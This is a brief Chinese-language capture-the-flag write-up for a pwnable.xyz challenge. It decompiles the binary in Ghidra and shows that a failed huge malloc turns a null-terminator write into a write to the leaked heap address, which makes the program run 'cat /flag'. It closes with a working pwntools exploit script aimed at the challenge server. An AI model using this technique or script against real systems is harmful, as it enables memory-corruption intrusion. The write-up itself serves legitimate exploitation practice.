用ghidra查看代码
```c
undefined8 FUN_00100920(void)

{
  long *plVar1;
  void *__buf;
  long in_FS_OFFSET;
  size_t local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00100b4e();
  puts("Welcome.");
  plVar1 = (long *)malloc(0x40000);
  *plVar1 = 1;                                  // 已经赋值
  __printf_chk(1,"Leak: %p\n",plVar1);          // plVar1的值已暴露
  __printf_chk(1,"Length of your message: ");
  local_28 = 0;
  __isoc99_scanf(&DAT_00100c50,&local_28);
  __buf = malloc(local_28);
  __printf_chk(1,"Enter your message: ");
  read(0,__buf,local_28);
  *(undefined *)((long)__buf + (local_28 - 1)) = 0;
  write(1,__buf,local_28);
  if (*plVar1 == 0) {                       // 关键代码，前面已经赋值，故条件不成立
    system("cat /flag");
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```



可以利用这行代码使关键代码处判断条件为正，即 `*plVar1 == 0`
```c
*(undefined *)((long)__buf + (local_28 - 1)) = 0;
```


所以，问题变为如何让以下条件成立:
```c
(long)__buf + (local_28 - 1) == plVar1
```

其中，__buf 为malloc的返回值，local_28为入参
```c
__buf = malloc(local_28);
```
当入参很大时，malloc的返回值为0


条件变为
```c
local_28 - 1 == plVar1
```

脚本:
```python
from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30000)
p.recvuntil(b'Leak:')
addr = p.recvline()
addr = int(addr, 16) + 1
print('addr:', addr)
p.recvuntil(b':')
p.sendline(str(addr))
p.recvuntil(b':')
p.sendline(b'')
p.interactive()
```
